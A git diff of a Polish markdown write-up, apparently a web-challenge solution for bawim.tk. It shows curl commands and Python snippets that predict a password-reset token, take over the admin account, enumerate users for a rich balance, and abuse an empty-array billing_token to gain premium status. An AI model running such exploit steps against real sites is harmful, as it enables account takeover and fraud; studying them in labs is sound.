@@ -45,7 +45,6 @@ parametry: key, billing_token, json - ten endpoint obsługuje dane wejściowe w 
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/user/386  
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d user_key=AnbgzkuaayRdT4HIab8lV513 https://bawim.tk/user_data/386  
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/reset_password/386  
-  
   ```python
   # Funkcja generujaca token yKW@n3UoT5n@xU5n@xUu.s
   def generate():
@@ -59,9 +58,8 @@ parametry: key, billing_token, json - ten endpoint obsługuje dane wejściowe w 
 
     return token
   ```
-  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d new_password=<wpisz_nowe_hasło_admina> https://bawim.tk/set_password/386/yKW@n3UoT5n@xU5n@xUu.s
-  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d password=<wpisz_nowe_hasło_admina> https://bawim.tk/login/admin
-  
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d new_password=<wpisz_nowe_hasło_admina> https://bawim.tk/set_password/386/yKW@n3UoT5n@xU5n@xUu.s  
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d password=<wpisz_nowe_hasło_admina> https://bawim.tk/login/admin  
   ```python
    # Znajdywanie użytkownika, który ma na koncie $1.000.000
   import requests, json
@@ -80,7 +78,6 @@ parametry: key, billing_token, json - ten endpoint obsługuje dane wejściowe w 
 
       if(money == "1000000"): break
       i+=1
- 
 ```
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d json={\"billing_token\":[]} http://bawim.tk/set_premium_account/200  
   
